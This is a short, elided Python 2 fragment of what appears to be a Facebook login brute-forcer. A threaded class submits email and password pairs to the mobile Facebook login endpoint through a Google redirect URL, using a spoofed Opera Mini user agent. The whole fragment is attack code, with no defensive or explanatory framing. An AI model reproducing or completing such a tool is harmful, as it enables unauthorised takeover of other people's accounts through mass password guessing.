...
class mt(threading.Thread):
	...
	def run(self):
		try:
			data = urllib2.urlopen(urllib2.Request(url='https://www.google.com/url?q=https://m.facebook.com/login/',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254.122938/85. U; id) Presto/2.12.423 Version/12.16'}))
